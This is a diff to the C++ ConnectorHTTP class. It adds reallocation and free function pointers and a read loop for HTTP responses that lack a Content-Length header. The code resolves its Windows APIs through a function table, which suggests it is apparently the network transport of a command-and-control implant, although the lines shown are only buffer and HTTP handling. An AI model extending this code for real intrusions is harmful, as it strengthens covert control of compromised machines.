@@ -38,6 +38,8 @@ ConnectorHTTP::ConnectorHTTP()
 	this->functions = (HTTPFUNC*) alloc(LPTR, sizeof(HTTPFUNC) );
 	
 	this->functions->LocalAlloc     = alloc;
+	this->functions->LocalReAlloc   = LocalReAlloc;
+	this->functions->LocalFree      = LocalFree;
 	this->functions->GetProcAddress = GetProcAddress;
 	this->functions->LoadLibraryA   = LoadLibraryA;
 
@@ -111,10 +113,10 @@ BYTE* ConnectorHTTP::SendData(BYTE* data, ULONG data_size, ULONG* recv_size)
 					result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLenght, 0);
 					
 					if ( result && _atoi(statusCode) == 200 ) {
-						DWORD dwLengthDataSize = sizeof(DWORD);
 						DWORD answerSize = 0;
+						DWORD dwLengthDataSize = sizeof(DWORD);
 						result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &answerSize, &dwLengthDataSize, NULL);
-						
+	
 						if ( result ) {
 							DWORD dwNumberOfBytesAvailable = 0;
 							result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
@@ -133,6 +135,33 @@ BYTE* ConnectorHTTP::SendData(BYTE* data, ULONG data_size, ULONG* recv_size)
 								}					
 								*recv_size = numberReadedBytes;
 								recv = buffer;
+							}
+						}
+						else if ( GetLastError() == ERROR_HTTP_HEADER_NOT_FOUND ) {
+							ULONG numberReadedBytes = 0;
+							DWORD readedBytes = 0;
+							BYTE* buffer = (BYTE*) this->functions->LocalAlloc(LPTR, 0);
+							DWORD dwNumberOfBytesAvailable = 0;
+
+							while (1) {
+								result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
+								if ( !result || !dwNumberOfBytesAvailable )
+									break;
+
+								buffer = (BYTE*)this->functions->LocalReAlloc(buffer, dwNumberOfBytesAvailable + numberReadedBytes, LMEM_MOVEABLE);
+								result = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
+								if ( !result || !readedBytes) {
+									break;
+								}
+								numberReadedBytes += readedBytes;
+							}
+
+							if (numberReadedBytes) {
+								*recv_size = numberReadedBytes;
+								recv = buffer;
+							}
+							else {
+								this->functions->LocalFree(buffer);
 							}
 						}
 					}
